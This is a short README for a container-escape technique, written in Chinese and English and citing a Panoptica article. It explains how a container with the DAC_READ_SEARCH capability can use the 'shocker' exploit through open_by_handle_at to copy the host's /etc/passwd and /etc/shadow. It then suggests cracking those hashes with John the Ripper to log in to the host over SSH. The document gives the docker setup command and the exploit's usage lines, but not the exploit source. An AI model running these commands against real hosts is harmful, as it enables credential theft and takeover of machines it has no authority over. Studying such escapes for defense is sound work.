# Reading secrects from the host
From:https://www.panoptica.app/research/7-ways-to-escape-a-container

## Description
DAC_READ_SEARCH功能允许绕过文件或目录读取权限检查，并使用“open_by_handle_at”系统调用来读取它。此系统调用允许遍历整个主机的文件系统。在这个容器转义技术中，我们将使用“open_by_handle_at”系统调用执行从主机读取/etc/passwd和/etc/sahdow文件的代码，并将其内容保存在容器中。接下来，我们将使用“John the Ripper”密码破解器来获取主机用户的密码，该密码可用于与主机的SSH连接。

## Usage
搭建环境
```bash
sudo docker run -it --cap-drop=ALL --cap-add=DAC_READ_SEARCH --cap-add=SETGID --cap-add=SETUID --cap-add=CHOWN --cap-add=FOWNER --cap-add=DAC_OVERRIDE ubuntu bash
```
利用
```bash
# Copy the shocker.c content
vim shocker.c
gcc -o shocker shocker.c
# Use the shocker to read files from host:./shocker /host/path /container/path
./shocker /etc/passwd passwd
./shocker /etc/shadow shadow
```